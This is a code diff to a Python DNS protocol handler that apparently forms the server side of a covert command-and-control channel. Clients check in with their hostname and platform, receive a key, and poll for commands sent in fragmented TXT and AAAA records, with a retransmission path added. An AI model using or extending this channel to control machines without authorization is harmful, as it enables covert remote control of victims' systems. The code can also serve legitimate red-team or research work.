@@ -5,7 +5,15 @@ from enum import Enum
 from collections import deque
 import logging
 
-
+retransmit = {
+    "a": 1, "b": 2, "c": 3, "d": 4,
+    "e": 5, "f": 6, "g": 7, "h": 8,
+    "i": 9, "j": 10, "k": 11, "l": 12,
+    "m": 13, "n": 14, "o": 15, "p": 16,
+    "q": 17, "r": 18, "s": 19, "t": 20,
+    "u": 21, "v": 22, "w": 23, "x": 24,
+    "y": 25, "z": 26
+}
 
 class Records(Enum):
     """ The types of records the DNSHandler can currently encode """
@@ -17,6 +25,7 @@ class Domains(Enum):
     SYNC = "sync"    
     ENCRYPT = "encrypt"
     QUERY = "query"
+    RETRANSMIT = "rquery"
     CONFIRM = "confirm"
 
 class Opcodes(Enum):
@@ -38,6 +47,8 @@ class DNSHandler(ProtocolHandler):
         self.latest_request_id = None
         self.edns = False
         self.fragments = deque()
+        self.prev_cmd = []
+        self.test = 1
 
     def __repr__(self):
         return "DNS"
@@ -55,6 +66,7 @@ class DNSHandler(ProtocolHandler):
             if query[3] == Domains.SYNC.value:
                 platform, hostname = query[5], query[4]
                 self._send_data(request, port, Opcodes.ACK.value, None)
+                self.fragments.clear()
                 return (platform, hostname)
             else:
                 # Issue a SYNC-REQUEST if server went down and needs to resync
@@ -74,17 +86,19 @@ class DNSHandler(ProtocolHandler):
             query = str(q.get_qname()).split(".")[::-1]
             if query[3] == Domains.ENCRYPT.value:
                 self._send_data(request, port, Opcodes.KEY.value, key)
+                self.fragments.clear()
                 return 1
             elif query[3] == Domains.CONFIRM.value:
                 if query[4] == Domains.ENCRYPT.value:
                     self._send_data(request, port, Opcodes.ACK.value, None)
+                    self.fragments.clear()
                     return 2
             else:
                 # Return back to SYNC state, will perform SYNC-REQUEST
                 self.logger.debug(f"{self.ip}: Client not in ENCRYPT. Falling back to SYNC")
                 return 0
 
-        except DNSError as e:
+        except DNSError:
             self.logger.debug(f"[{self.ip}] encrypt: DNS Query Malformed")
             return 1
 
@@ -92,14 +106,22 @@ class DNSHandler(ProtocolHandler):
         """
         See protocolhandler.py
         """
-        cmd_opcode = 0 if cmd.type == CommandType.NOP else 3
         data = raw_request[0].strip()
         try:
-            # if request.header.id != self.latest_id used for triplicate packets on windows
             request = DNSRecord.parse(data)
-            q = request.questions[0]
-            query = str(q.get_qname()).split(".")[::-1]
-            if query[3] != Domains.QUERY.value:
+            question = request.questions[0]
+            query = str(question.get_qname()).split(".")[::-1]
+
+            # If the client has request a new command or a retrasmission
+            # of missing fragmented pieces we continue
+            if query[3] == Domains.QUERY.value:
+                pass
+            elif query[3] == Domains.RETRANSMIT.value:
+                # Get the missing chunk from the translated mapping from alphabet
+                # to integers
+                fragment = self.prev_cmd[retransmit[query[4]] - 1]
+                self._send_fragment(request, fragment, port)
+            else:
                 # Return back to SYNC state, will perform SYNC-REQUEST
                 self.logger.debug(f"{self.ip}: Client not in QUERY. Falling back to SYNC")
                 return 0
@@ -111,26 +133,20 @@ class DNSHandler(ProtocolHandler):
                 # assemble a command from multiple packets
                 if self.fragments:
                     frag = self.fragments.popleft()
+                    self.logger.debug("Sending Fragment")
                     self._send_fragment(request, frag, port)
                     if not self.fragments:
+                        self.logger.debug("Returning To Ready State")
                         return 2
                     return 3
                 # Otherwise we just send the next command
                 self.latest_request_id = request.header.id
+                cmd_opcode = 0 if cmd.type == CommandType.NOP else 3
                 self._send_data(request, port, cmd_opcode, cmd.command)
                 return 2
-            elif opcode == 1: # INVERSE QUERY (Deprecated)
-                pass
-            elif opcode == 2: # SERVER STATUS REQUEST
-                pass
-            elif opcode == 3: # RESERVED (NOT USED)
-                pass
-            elif opcode == 4: # NOTIFY
-                pass
-            elif opcode == 5: # 5 UPDATE
-                pass
             else:
                 pass
+
         except DNSError as e:
             self.logger.debug(f"[{self.ip}] respond: DNS Packet Malformed: {str(e)}")
         
@@ -138,21 +154,11 @@ class DNSHandler(ProtocolHandler):
             return 3
         return 2
     
-    def _send_fragment(self, query: DNSRecord, fragment, port: int):
-        # TODO: DISALLOW RECORD SWITCHING BETWEEN FRAGMENTS
-        # Generate skeleton question for packet
-        response = query.reply()
-        if query.questions[0].qtype == 16:
-            constructor = TXT
-        else:
-            constructor = AAAA
 
-        rr = RR(rname=query.get_q().get_qname(),
-                rtype=query.questions[0].qtype,
-                rclass=CLASS.IN,
-                rdata=constructor(fragment),
-                ttl=1337)
-        response.add_answer(rr)
+    def _send_fragment(self, query: DNSRecord, fragment: RR, port: int):
+        # TODO: DISALLOW RECORD SWITCHING BETWEEN FRAGMENTS
+        response = query.reply()
+        response.add_answer(fragment)
         self.socket.sendto(response.pack(), (self.ip, port))
         
 
@@ -162,23 +168,22 @@ class DNSHandler(ProtocolHandler):
         """
 
         rr_type = query.questions[0].qtype
-        # Generate skeleton question for packet
         response = query.reply()
         
         if rr_type == 16:
-            response = self._packetize_txt(query, response, rr_type, opcode, data)
+            response = self._packetize_txt(query, response, opcode, data)
         elif rr_type == 28:
-            response, rest = self._packetize_aaaa(query, response, rr_type, opcode, data)
+            response, rest = self._packetize_aaaa(query, response, opcode, data)
             self.fragments = rest
         else:
             self.logger.debug("send_data: invalid record")
             pass
 
-        # Reply
         self.socket.sendto(response.pack(), (self.ip, port))
 
-    def _packetize_txt(self, query, response, rr_type, opcode, data=None):
+    def _packetize_txt(self, query, response, opcode, data=None):
         _, constructor, msg_size = Records.TXT.value
+        rr_type = query.questions[0].qtype
         chunks = [f"{data[i:i+msg_size]}" for i in range(0, len(data), msg_size)] 
         if opcode == 0:
             response.add_answer(
@@ -200,11 +205,13 @@ class DNSHandler(ProtocolHandler):
         return response
 
 
-    def _packetize_aaaa(self, query, response, rr_type, opcode, data=None):
+    def _packetize_aaaa(self, query, response, opcode, data=None):
+        self.prev_cmd = []
         if not data:
             data = "test"
 
         _, constructor, msg_size = Records.AAAA.value
+        rr_type = query.questions[0].qtype
         chunks = [data[i:i+msg_size] for i in range(0, len(data), msg_size)]
         rest = deque()
         if opcode == 0 or not data:
@@ -229,6 +236,7 @@ class DNSHandler(ProtocolHandler):
                         # 1st byte indicates data, second byte is seq number, 3rd is num transmission packets
                         rdata=constructor(data),
                         ttl=1337)
+                self.prev_cmd.append(answer)
                 
             
                 # Add at least one response to the query
@@ -241,5 +249,5 @@ class DNSHandler(ProtocolHandler):
                 if self.edns and i > 0:
                     response.add_answer(answer)
                 else:
-                    rest.append(data)
+                    rest.append(answer)
         return response, rest
